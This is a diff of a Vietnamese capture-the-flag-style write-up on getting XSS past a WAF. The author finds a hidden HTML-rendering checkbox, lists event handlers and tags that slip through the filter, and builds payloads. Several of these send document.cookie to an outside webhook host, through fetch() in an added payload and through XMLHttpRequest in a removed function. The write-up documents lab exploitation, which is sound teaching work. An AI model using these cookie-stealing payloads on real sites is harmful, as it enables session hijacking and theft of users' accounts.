@@ -101,35 +101,37 @@ Bản chất cách này bypass được SOP vì khi TTL của bản ghi địa c
 Tưởng  vậy là đã xong nhưng mình test mãi mà ko hiểu sao chỉ xem được nội dung của chính trang được host trên VPS của mình. Khá cay cú 😠
 
 Mình tìm hiểu ra thì biết trình duyệt hiện đại có cơ chế PNA (Private Network Access): https://developer.chrome.com/blog/private-network-access-update-2024-03 và DNS Pinning: https://security.stackexchange.com/questions/14038/does-dns-pinning-protect-against-all-dns-rebinding-attacks.
-Mình thấy khó quá, không cách nào vượt qua được nên
-
+Mình thấy khó quá, không cách nào được thêm tiến bộ gì nữa nên tạm thời gác lại hướng này 😥
 
 ![[Attachments/Pasted image 20261101141502.png]]
 
+Thế là mình lại quay lại mò mẫm. Trong lúc tìm xem HTML có cái gì ko thì mình thấy một cái tuyệt vời và mình thấy ngay mấu chốt của bài tập ;))
+Ảo tung chảo thật sự, có một checkbox trong form Submit có tên 'enable-html-rendering':
+![[Attachments/Pasted image 20261101143651.png]]
 
+Má, checkbox này được tàng hình bởi CSS :))) troll troll thật, thế là mình thêm `&enable-html-rendering=on` ở cuối mỗi request submit gửi đi, kết quả là render được thật.
 
+Lúc này thì mình mới thấy cái script mình viết lúc đầu có tác dụng:
+```
+Event bypass:
+['onbeforematch', 'onbeforepaste', 'oncancel', 'oncommand', 'oncontentvisibilityautostatechange', 'oncontentvisibilityautostatechange(hidden)', 'ondragexit', 'onfocus(autofocus)', 'onformdata', 'ongesturechange', 'ongestureend', 'ongesturestart', 'ongotpointercapture', 'onloadstart', 'onlocation', 'onlostpointercapture', 'onpagereveal', 'onpageswap', 'onpointercancel', 'onpromptaction', 'onpromptdismiss', 'onscrollsnapchange', 'onscrollsnapchanging', 'onsecuritypolicyviolation', 'onslotchange', 'onstream', 'onsuspend', 'ontoggle(popover)', 'ontouchcancel', 'onvalidationstatuschange', 'onwaiting', 'onwaiting(loop)', 'onwebkitanimationend', 'onwebkitanimationiteration', 'onwebkitanimationstart', 'onwebkitfullscreenchange', 'onwebkitmouseforcechanged', 'onwebkitmouseforcedown', 'onwebkitmouseforceup', 'onwebkitmouseforcewillbegin', 'onwebkitneedkey', 'onwebkitplaybacktargetavailabilitychanged', 'onwebkitpresentationmodechanged', 'onwebkittransitionend', 'onwebkitwillrevealbottom']
+----------
+Tag bypass:
+['a', 'abbr', 'acronym', 'animate', 'animatemotion', 'animatetransform', 'area', 'article', 'aside', 'b', 'base', 'bdi', 'bdo', 'big', 'blink', 'blockquote', 'body', 'br', 'button', 'caption', 'center', 'cite', 'code', 'col', 'colgroup', 'content', 'data', 'datalist', 'dd', 'del', 'details', 'dfn', 'dialog', 'dir', 'div', 'dl', 'dt', 'element', 'em', 'embed', 'fieldset', 'figcaption', 'figure', 'font', 'footer', 'form', 'frame', 'frameset', 'h1', 'head', 'header', 'hgroup', 'hr', 'html', 'i', 'input', 'ins', 'kbd', 'keygen', 'label', 'legend', 'li', 'link', 'listing', 'main', 'map', 'mark', 'marquee', 'menu', 'menuitem', 'meta', 'meter', 'multicol', 'nav', 'nextid', 'nobr', 'noembed', 'noframes', 'noscript', 'object', 'ol', 'optgroup', 'option', 'output', 'p', 'param', 'picture', 'plaintext', 'pre', 'progress', 'q', 'rb', 'rp', 'rt', 'rtc', 'ruby', 's', 'samp', 'section', 'select', 'set', 'shadow', 'slot', 'small', 'source', 'spacer', 'span', 'strike', 'strong', 'style', 'sub', 'summary', 'sup', 'table', 'tbody', 'td', 'template', 'textarea', 'tfoot', 'th', 'thead', 'time', 'title', 'tr', 'track', 'tt', 'u', 'ul', 'var', 'wbr', 'xmp', 'xss']
+```
+
+Mình chọn tag `<b>` làm vector tấn công sau đó sử dụng XSS cheat sheet của Port Swigger và dễ dàng craft ra một payload XSS lách qua các keyword bị cấm bởi WAF:
+
+```html
 <style>@keyframes x{}</style><b style="animation-name:x" onwebkitanimationstart="print()"></b>
-
-
 ```
-function exfil_by_rq_get(info_name, text) {
-  var xhttp = new XMLHttpRequest();
-  xhttp.open(
-    "GET",
-    "https://7f66658a-2b27-47ed-80ff-545eca5c9dba.webhooksite.net" +
-      "/exfil_by_rq_get/" +
-      "c" +
-      "?" +
-      "c" +
-      "=" +
-      document.cookie,
-    true
-  );
-  xhttp.send()
-}
+![[Attachments/Pasted image 20261101144137.png]]
+Ý tưởng dùng print() thay cho alert(1) mình cũng đọc trong một bài báo trước mình đọc ở Port Swigger :D Do ở đây `alert` đã nằm trong keyword bị cấm. 
+
+```html
+<style>@keyframes x{}</style>
+<b style="animation-name:x" onwebkitanimationstart="fetch('https://7f66658a-2b27-47ed-80ff-545eca5c9dba.webhooksite.net/?c='+document.cookie)"></b>
 ```
-
-
 
 <style>@keyframes x{}</style>
 <b style="animation-name:x" onwebkitanimationstart="
